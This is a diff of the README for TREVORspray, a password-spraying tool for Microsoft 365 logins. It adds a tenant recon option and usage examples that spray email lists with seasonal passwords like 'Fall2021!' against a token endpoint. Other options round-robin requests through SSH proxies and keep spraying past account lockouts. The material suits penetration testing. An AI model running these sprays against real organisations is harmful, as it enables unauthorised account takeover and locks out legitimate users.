@@ -25,22 +25,31 @@ $ pip install -r requirements.txt
 ## Example: Perform recon against a domain (retrieves tenant info, autodiscover, mx records, etc.)
 ```bash
 trevorspray.py --recon evilcorp.com
+...
+    "token_endpoint": "https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token"
+...
+```
+
+## Example: Spray against discovered "token_endpoint" URL
+```bash
+trevorspray.py -e emails.txt -p Fall2021! --url https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token
 ```
 
 ## Example: Spray with 5-second delay between requests
 ```bash
-trevorspray.py -e bob@evilcorp.com -p Fall2020! --delay 5
+trevorspray.py -e bob@evilcorp.com -p Fall2021! --delay 5
 ```
 
 ## Example: Spray and round-robin between 3 IPs (the current IP is used as well.)
 ```bash
-trevorspray.py -e emails.txt -p Fall2020! --ssh root@1.2.3.4 root@4.3.2.1
+trevorspray.py -e emails.txt -p Fall2021! --ssh root@1.2.3.4 root@4.3.2.1
 ```
 
 ## TREVORspray - Help:
 ```
 $ ./trevorspray.py --help
-usage: trevorspray.py [-h] -e EMAILS [EMAILS ...] -p PASSWORDS [PASSWORDS ...] [-f] [-d DELAY] [-u URL] [-v] [-s SSH [SSH ...]] [-k KEY] [-b BASE_PORT] [-n]
+usage: trevorspray.py [-h] [-e EMAILS [EMAILS ...]] [-p PASSWORDS [PASSWORDS ...]] [-r DOMAIN [DOMAIN ...]] [-f] [-d DELAY] [-u URL] [-v] [-s USER@SERVER [USER@SERVER ...]] [-k KEY]
+                      [-b BASE_PORT] [-n]
 
 Execute password sprays against O365, optionally proxying the traffic through SSH hosts
 
@@ -50,12 +59,14 @@ optional arguments:
                         Emails(s) and/or file(s) filled with emails
   -p PASSWORDS [PASSWORDS ...], --passwords PASSWORDS [PASSWORDS ...]
                         Password(s) that will be used to perform the password spray
+  -r DOMAIN [DOMAIN ...], --recon DOMAIN [DOMAIN ...]
+                        Retrieves info related to authentication, email, Azure, Microsoft 365, etc.
   -f, --force           Forces the spray to continue and not stop when multiple account lockouts are detected
   -d DELAY, --delay DELAY
                         Sleep for this many seconds between requests
   -u URL, --url URL     The URL to spray against (default is https://login.microsoft.com)
   -v, --verbose         Show which proxy is being used for each request
-  -s SSH [SSH ...], --ssh SSH [SSH ...]
+  -s USER@SERVER [USER@SERVER ...], --ssh USER@SERVER [USER@SERVER ...]
                         Round-robin load-balance through these SSH hosts (user@host) NOTE: Current IP address is also used once per round
   -k KEY, --key KEY     Use this SSH key when connecting to proxy hosts
   -b BASE_PORT, --base-port BASE_PORT
